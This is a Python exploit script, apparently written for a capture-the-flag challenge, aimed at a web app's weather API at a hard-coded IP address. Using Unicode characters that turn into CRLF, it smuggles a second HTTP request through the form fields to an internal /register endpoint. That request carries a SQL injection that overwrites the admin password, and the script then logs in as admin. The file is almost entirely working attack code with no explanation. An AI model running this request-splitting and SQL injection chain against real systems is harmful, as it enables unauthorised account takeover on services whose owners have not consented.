import requests

url = "http://165.227.225.205:31237"

register_url = url + "/register"
login_url = url + "/login"
weather_url = url + "/api/weather"

crlf = '\u010D\u010A'
space = '\u0120'

p = ''
p += space + 'HTTP/1.1'
p += crlf
p += 'Host:' + space + '127.0.0.1' + crlf
p += 'Connection:' + space + 'close' + crlf
p += crlf
p += 'POST' + space + '/register?1=2'

p1 = ''
p1 += space + 'HTTP/1.1'
p1 += crlf
p1 += 'Host:' + space + '127.0.0.1' + crlf
p1 += 'Connection:' + space + 'close' + crlf
p1 += 'Content-Type:' + space + 'application/x-www-form-urlencoded' + crlf
p1 += 'Content-Length:' + space + '125' + crlf
p1 += crlf

# username=admin&password=k') ON CONFLICT(username) DO UPDATE SET password='yeee' where username='admin' --
p1 += 'username=admin&password=a%27%29+ON+CONFLICT%28username%29+DO+UPDATE+SET+password%3D%27pass%27+where+username%3D%27admin%27+--'

p1 += crlf
p1 += crlf
p1 += 'GET' + space + '/asdf'

data = {"endpoint": "127.0.0.1", "city": "aaaa" + p, "country": "aaaa" + p1}
print(data)

requests.post(weather_url, data=data)

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

response = requests.post(login_url, headers=headers, data={"username": "admin", "password": "pass"})

print(response.text)


# curl "http://localhost:1337/login" -X POST -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3" --compressed -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://localhost:1337" -H "Connection: keep-alive" -H "Referer: http://localhost:1337/login" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-User: ?1" -H "Sec-GPC: 1" --data-raw "username=admin&password=123456"